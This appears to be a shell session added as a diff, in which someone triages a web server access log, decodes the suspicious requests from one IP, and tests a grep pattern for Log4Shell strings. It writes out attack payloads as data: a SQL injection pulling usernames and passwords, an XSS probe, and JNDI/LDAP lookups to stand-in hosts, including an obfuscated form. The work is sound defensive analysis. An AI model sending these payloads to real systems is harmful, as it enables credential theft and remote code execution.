@@ -1,0 +1,26 @@
+$ awk '$9 ~ /^4/ {n[$1]++; if (!seen[$1, $7]++) d[$1]++} END {for (ip in n) if (n[ip] >= 5) print ip, n[ip] " lần 4xx", d[ip] " đường dẫn khác nhau"}' logs/access.log | sort -k4 -rn
+203.0.113.66 10 lần 4xx 10 đường dẫn khác nhau
+192.0.2.53 6 lần 4xx 1 đường dẫn khác nhau
+192.0.2.52 6 lần 4xx 1 đường dẫn khác nhau
+192.0.2.51 6 lần 4xx 1 đường dẫn khác nhau
+$ awk '$1 == "203.0.113.66" && $9 ~ /^2/ {print $9, $7}' logs/access.log
+200 /api/products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--
+200 /api/products?q=%3Cscript%3Ealert(1)%3C/script%3E
+200 /api/products?x=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.66%3A1389%2Fa%7D
+$ awk '$1 == "203.0.113.66" && $9 ~ /^2/ && $7 !~ /^\/api\/products\?/' logs/access.log | wc -l
+0
+$ python3 -c "import urllib.parse,sys; [print(urllib.parse.unquote(a)) for a in sys.argv[1:]]" '/api/products?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--' '/api/products?q=%3Cscript%3Ealert(1)%3C/script%3E'
+/api/products?id=1' UNION SELECT username,password FROM users--
+/api/products?q=<script>alert(1)</script>
+$ printf '%s\n' 'ua=${jndi:ldap://x.test/a}' 'GET /?x=%24%7Bjndi%3Aldap%3A%2F%2Fx.test%2Fa%7D' 'ua=${${lower:j}ndi:ldap://x.test/a}' 'ua=Mozilla/5.0 {jndi} binh thuong' > thu-jndi.txt; cat -n thu-jndi.txt
+     1	ua=${jndi:ldap://x.test/a}
+     2	GET /?x=%24%7Bjndi%3Aldap%3A%2F%2Fx.test%2Fa%7D
+     3	ua=${${lower:j}ndi:ldap://x.test/a}
+     4	ua=Mozilla/5.0 {jndi} binh thuong
+$ grep -niE '(\$|%24)(\{|%7B)(jndi|(\$|%24)(\{|%7B)lower:j(\}|%7D)ndi)' thu-jndi.txt
+1:ua=${jndi:ldap://x.test/a}
+2:GET /?x=%24%7Bjndi%3Aldap%3A%2F%2Fx.test%2Fa%7D
+3:ua=${${lower:j}ndi:ldap://x.test/a}
+$ grep -ciE '(\$|%24)(\{|%7B)(jndi|(\$|%24)(\{|%7B)lower:j(\}|%7D)ndi)' logs/access.log
+1
+$ rm thu-jndi.txt
